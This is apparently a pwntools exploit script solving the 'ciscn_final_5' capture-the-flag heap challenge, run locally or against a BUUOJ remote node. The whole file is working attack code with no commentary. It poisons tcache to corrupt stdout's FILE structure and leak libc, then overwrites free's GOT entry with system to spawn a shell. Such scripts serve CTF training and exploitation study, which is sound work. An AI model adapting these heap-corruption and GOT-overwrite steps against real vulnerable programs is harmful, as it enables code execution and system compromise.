import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_final_5')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_final_5')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',28990)
			elf=ELF('./ciscn_final_5')
			libc=ELF('./libc.so.6')

		def add(a,b,c):
			io.sendlineafter('your choice: ','1')
			io.sendlineafter('index: ',str(a))
			io.sendlineafter('size: ',str(b))
			io.sendafter('content: ',c)

		def delete(a):
			io.sendlineafter('your choice: ','2')
			io.sendlineafter('index: ',str(a))

		def edit(a,c):
			io.sendlineafter('your choice: ','3')
			io.sendlineafter('index: ',str(a))
			io.sendafter('content: ',c)
		
		add(0x10,0x500,p64(0)+p64(0x541))
		add(0x1,0x30,'aaaa')
		delete(0)
		add(0x2,0x4f0,'/bin/sh\x00')
		add(0x3,0x30,'aaaa')
		delete(1)
		delete(3)
		add(1,0x30,p64(0x6020a0))
		add(3,0x30,p64(0x602080+0x10+3))
		add(4,0x30,'\x60')
		add(5,0x30,p64(0xfbad1800)+p64(0)*3+'\xc8')
		libc_base=u64(io.recv(8))-libc.sym['_IO_2_1_stdin_']
		libc.address=libc_base
		add(10,0x40,'aaaa')
		add(0x10,0x500,p64(0)+p64(0x551))
		add(0x6,0x40,'aaaa')
		delete(0)
		add(0x7,0x4f0,'aaaa')
		add(0x8,0x40,'aaaa')
		delete(6)
		delete(8)
		add(6,0x40,p64(elf.got['free']))
		add(8,0x40,'/bin/sh\x00')
		add(9,0x40,p64(libc.sym['system']))
		delete(2)




		#success('libc_base:'+hex(libc_base))
		#gdb.attach(io)
		#pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue